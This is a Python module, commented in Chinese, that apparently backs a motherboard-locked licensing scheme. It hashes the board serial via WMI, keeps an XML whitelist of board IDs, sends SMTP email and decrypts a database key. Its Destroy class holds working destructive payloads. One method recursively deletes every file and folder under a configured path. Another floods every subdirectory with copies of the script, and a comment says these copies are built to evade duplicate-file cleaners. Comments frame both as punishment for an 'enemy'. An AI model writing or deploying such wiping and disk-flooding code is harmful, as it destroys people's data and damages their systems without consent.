import os,sys
import wmi
import time
import shutil
import hashlib
import smtplib
import cryptlib
from email.mime.text import MIMEText
from lxml import etree,objectify
from config import email_id,\
    email_port,email_to,email_pwd,\
    email_from,content,subject,path


class Attribute(object):
    # 附加功能类
    def __init__(self):
        self.e_from = email_from
        self.e_pwd = email_pwd
        self.e_to = email_to
        self.port = email_port
        self.e_id = email_id

    def emil_min(self):
        #邮件内容支持HTM格式
        Email = MIMEText(content, "html", "utf-8")
        Email['Subject'] = subject
        Email['From'] = self.e_from
        Email['To'] = self.e_to
        try:
            s = smtplib.SMTP_SSL(self.e_id, self.port)  # 邮件服务器及端口号
            s.login(self.e_from, self.e_pwd)
            s.sendmail(self.e_from, self.e_to, Email.as_string())
            s.quit()
        except:
            print('发送失败！')

    def BIOS_board(self):
        # 获取BIOS和主板信息（特征码）并使用sha3作为哈希加密算法，请注意，sha1和MD5早已被破解请勿使用
        w = wmi.WMI()
        board = w.Win32_BaseBoard()
        for i in board:
            ha_ber = hashlib.sha3_256(str(i.SerialNumber).encode('utf8'))
            br = ha_ber.hexdigest()
            #snumber = uuid.uuid5(uuid.NAMESPACE_DNS, br)
            return br

    def control(self,path, name):
        # 文件监控
        # st_atime(访问时间), st_mtime(修改时间), st_ctime（创建时间)
        suffer = os.path.join(path, name)
        statinfo = os.stat(suffer)
        return time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_mtime))


class Destroy(object):
    # 附加负面效果属性类,谨慎使用的类，易诱发不良后果，特别是第一个方法不是仇人就不要乱搞
    def __init__(self):
        self.del_path = path

    def delfile(self):
        # 递归删除文件夹及其文件方法，尽量不用，做事留余地
        try:
            file_li = os.listdir(self.del_path)
            for i in file_li:
                file_path = os.path.join(self.del_path, i)
                if os.path.isfile(file_path):
                    os.remove(file_path)
                elif os.path.isdir(file_path):
                    shutil.rmtree(file_path, True)
        except PermissionError:
            pass

    def junk(self,ppach,max):
        #生成大量垃圾无用文件，ppach是指定父文件夹路径，max是生成数量最大值,
        # 数值越大运行越慢，注意掌握好平衡，太恶心人了也要不得
        file_li = []
        for a, b, c in os.walk(ppach):
            file_li.append(str(a))
        for i in file_li:
            f_path = os.path.join(ppach, i)
            if os.path.isdir(f_path):
                with open(__file__, 'r', encoding='utf-8') as f:
                    a = f.read()
                file_path = os.path.join(f_path, __file__)
                name = os.path.basename(file_path)
                (filename, listname) = os.path.splitext(name)
                for i in range(1, int(max)+1):
                    file = os.path.join(f_path, filename + str(i) + listname)
                    try:
                        with open(file, 'w') as f:
                            # 之所以添加换行主要是防止被清理垃圾软件的清理重复文件功能批量删除
                            f.write(str(a)+'\n')
                    except PermissionError:
                        pass

#许可白名单,有且仅有保存在这个文件里的主板Id可用
class Whitelists(object):

    def __init__(self,xml_name):
        self.name=xml_name      #保存的xml文件名
        self.tree=None          #新建xml文件
        self.xml=objectify.ElementMaker(annotate=False)

    def new_xml(self,data):
        self.tree = self.xml.writelists(
            self.xml.data(data)
        )
        etree.ElementTree(self.tree).write(self.name, pretty_print=True)

    def add_xml(self,data):
        te=self.xml.data(data)
        self.tree.append(te)
        etree.ElementTree(self.tree).write(self.name, pretty_print=True)

    def read_xml(self):
        #因为直接读取xml文件的值是元组类型，不能被修改，因此转换为列表
        li=[]                   #存入列表
        tree=etree.parse(self.name)
        for i in tree.xpath('//data'):
            li.append(str(i.text))
        return li


#新建一个上下文管理器，这里处理的是有关处理数据库安全的措施，执行了一个打开关闭的动作（即解密再加密）
class Operaction():

    def __enter__(self):
        return self

    def open(self):
        #解密box.key和数据库
        rsa = cryptlib.RSA()
        rsa.decrypt('box.key')
        db = cryptlib.enboxdb()
        db.dedb()


    def close(self):
        #加密box.key和数据库
        db = cryptlib.enboxdb()
        db.endb()
        rsa = cryptlib.RSA()
        rsa.encrypt('box.key')

    def __exit__(self, exc_type, exc_val, exc_tb):
        return True